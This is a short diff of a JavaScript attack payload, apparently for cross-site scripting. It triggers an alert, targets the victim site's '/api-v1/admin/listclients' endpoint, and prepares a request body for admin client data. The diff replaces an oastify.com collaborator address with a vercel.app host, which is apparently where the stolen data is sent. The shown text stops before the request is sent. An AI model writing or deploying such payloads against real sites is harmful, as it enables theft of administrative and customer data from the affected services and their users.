@@ -1,7 +1,7 @@
 alert(9);
 const dm = document.domain 
 const url = 'https://' + dm + '/api-v1/admin/listclients';
-const url2 = 'https://twtvwvakzxlpzj9ov9bfz8j6ixoocf04.oastify.com/'
+const url2 = 'https://create-react-app-pjep-2wrhktcwy-r7840s-projects.vercel.app/'
 
 const data = {"clienttype":"admin","upline_id":-1,"results":25};
 
